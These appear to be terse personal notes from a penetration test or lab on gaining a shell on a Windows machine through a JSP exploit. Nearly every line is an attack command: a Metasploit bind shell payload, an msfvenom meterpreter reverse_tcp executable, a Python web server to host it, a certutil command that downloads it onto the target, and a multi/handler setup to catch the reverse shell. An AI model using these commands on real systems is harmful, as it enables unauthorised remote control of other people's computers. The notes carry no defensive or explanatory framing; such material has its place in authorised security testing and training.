set payload java/jsp_shell_bind_tcp
set SHELL cmd (for windows targets)
may have to run a few times if it fails as it takes some tries to succeed

getuid
whoami

Can also generate a reverse shell using MSFvenom and download it after you gain access using the bind shell above.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<yourip> LPORT=<yourport> -f exe > <anyfilename>
sudo python -m SimpleHTTPServer 80

now on the targer machine after you run the jsp exploit you can download with this command
certutil -urlcache -f http://<yourip>/<exploitfile> <filenameagain>
dir (to check if it was successful)
now you can setup a handler to receive the connection
vim handler.rc (this is if you want to automate and run a script on msfconsole, you can also just use the multi/handler module manually)
use multi/hander
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST
set LPORT
write and quit
msfconsole -r handler.rc
now on the target machine
.\<exploitfile>
